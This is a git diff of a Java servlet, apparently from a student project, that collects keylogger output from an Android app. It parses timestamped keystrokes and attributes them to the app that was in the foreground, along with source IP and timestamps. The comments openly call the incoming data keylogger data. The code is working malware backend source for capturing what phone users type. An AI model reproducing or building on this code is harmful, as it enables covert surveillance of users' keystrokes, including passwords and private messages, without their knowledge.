@@ -2,7 +2,12 @@ package com.cmusv.ninjabots;
 
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Collection;
+import java.util.Iterator;
 import java.util.List;
+import java.util.Map;
+import java.util.Set;
+import java.util.TreeMap;
 import java.util.logging.Logger;
 
 import javax.servlet.http.HttpServlet;
@@ -16,63 +21,90 @@ public class NinjabotscmuServlet extends HttpServlet {
 	private static final Logger logger = 
 			Logger.getLogger(NinjabotscmuServlet.class.getName());
 	private List<MobileApp> appList = new ArrayList<MobileApp>();
-
+	private Map<Double, String> timeStampKeyInput= new TreeMap<Double,String>();
 		
 	public void doGet(HttpServletRequest req, HttpServletResponse resp)
 			throws IOException {
 		
 		String appName = req.getParameter("appName");
-		String keyInput = req.getParameter("keyInput");
+		String keyInputs = req.getParameter("keyInput");
 		String timeStamp = req.getParameter("timeStamp");
 		String srcIP = req.getParameter("srcIP");
 		StringBuilder receivedParams = new StringBuilder();
 		resp.setContentType("text/plain");
-
-		//receivedParams.append("\n" + "timeStamp : " + timeStamp + "\n");
-		//receivedParams.append("srcIP : " + srcIP + "\n");		
-		if(timeStamp!=null && srcIP!=null)
+		generateTimestampKeyInputsMap(keyInputs);
+		MobileApp app = new MobileApp();
+		app.setAppName("tempApp");
+		app.setSrcIP(srcIP);
+		app.setTimeStamp(timeStamp);
+		
+		if(keyInputs != null && keyInputs.isEmpty() == false)
 		{
-			if (appName != null)
-			{
-				MobileApp curApp = new MobileApp();
-				curApp.setAppName(appName);
-				curApp.setSrcIP(srcIP);
-			    curApp.setTimeStamp(timeStamp);
-			    //TODO:check if AppName is not the same as previous entry in the arraylist
-			    appList.add(curApp);
-				//System.out.println(curApp.getAppName()+" *************************");
-				//receivedParams.append("appName : " + appName);
-			}
-			StringBuilder appdetails = new StringBuilder();
-			if (keyInput != null)
-			{
-				for(int i=1;i<appList.size();i++)
-				{
-					// Assuming keylogger is sent once per second. This should
-					// not be a problem since we will send keylogger data only
-					// when there is anything to send otherwise we wont make a
-					// call to the server. This is a temporary change that needs
-					// to be done the android app side for making things easier
-					// for us
-				//	System.out.println(appList.get(i).getAppName()+" *************************");
-					Double dTime = Double.parseDouble(timeStamp);
-					StringBuilder keylogger = new StringBuilder();
-					if(dTime > Double.parseDouble(appList.get(i-1).getTimeStamp()) 
-							&& dTime <= Double.parseDouble(appList.get(i).getTimeStamp()))
-					{
-						keylogger.append(keyInput);
-					}
-					appdetails.append(appList.get(i-1).getAppName()+ keylogger.toString());
-					//TODO:add json object- AppName and keylogger
-				}
-				receivedParams.append("keyInput : " + keyInput);
-				resp.getWriter().println("Scotty <3 secret data");
-				resp.getWriter().println(appdetails);
-			}
+			processKeyLoggerRequest(app);
 		}
 		logger.info(receivedParams.toString());
+	}
 
-		
+	private void processKeyLoggerRequest(MobileApp app) {
+		if (appList.size() == 0)
+		{
+			Collection<String> allKeyInputs = timeStampKeyInput.values();
+			Iterator<String> iAppKeys = allKeyInputs.iterator();
+			StringBuilder keysBuilder = new StringBuilder();
+			while(iAppKeys.hasNext())
+			{
+				keysBuilder.append(iAppKeys.next());
+			}
+			app.setKeyLog(keysBuilder.toString());
+			appList.add(app);
+		}
+		else
+		{
+			Set<Double> allKeyTimestamps = timeStampKeyInput.keySet();
+			Iterator<Double> iKeyTimestamps = allKeyTimestamps.iterator();
+			while(iKeyTimestamps.hasNext())
+			{
+				double keyTimeStamp = iKeyTimestamps.next();
+				for(int i = 1;i<appList.size();i++)
+				{
+					MobileApp oldApp = appList.get(i-1);
+					MobileApp recentApp = appList.get(i);
+					double oldAppTimestamp = Double.parseDouble(oldApp.getTimeStamp());
+					double recentAppTimestamp = Double.parseDouble(recentApp.getTimeStamp());
+					if(keyTimeStamp > oldAppTimestamp 
+							&& keyTimeStamp < recentAppTimestamp)
+					{
+						recentApp.setKeyLog(recentApp.getKeyLog()+timeStampKeyInput.get(keyTimeStamp));
+					}
+				}
+				MobileApp latestApp = appList.get(appList.size()-1);
+				if(keyTimeStamp > Double.parseDouble(latestApp.getTimeStamp()))
+				{
+					if(latestApp.getAppName().equals("tempApp"))
+					{
+						latestApp.setKeyLog(latestApp.getKeyLog()
+								+ timeStampKeyInput.get(keyTimeStamp));
+					}
+					else
+					{
+						app.setKeyLog(timeStampKeyInput.get(keyTimeStamp));
+						appList.add(app);
+					}
+				}
+			}
+		}
+	}
+
+	private void generateTimestampKeyInputsMap(String keyInputs) {
+		String keyInput[] = keyInputs.split("\n");
+		for(int i = 0; i<keyInput.length;i++)
+		{
+			String[] timeKeyPair=keyInput[i].split(":");
+			if( timeKeyPair.length == 2)
+			{
+				timeStampKeyInput.put(Double.parseDouble(timeKeyPair[0]),timeKeyPair[1]);
+			}
+		}
 	}
 	
 	public void doPost(HttpServletRequest req, HttpServletResponse resp) 
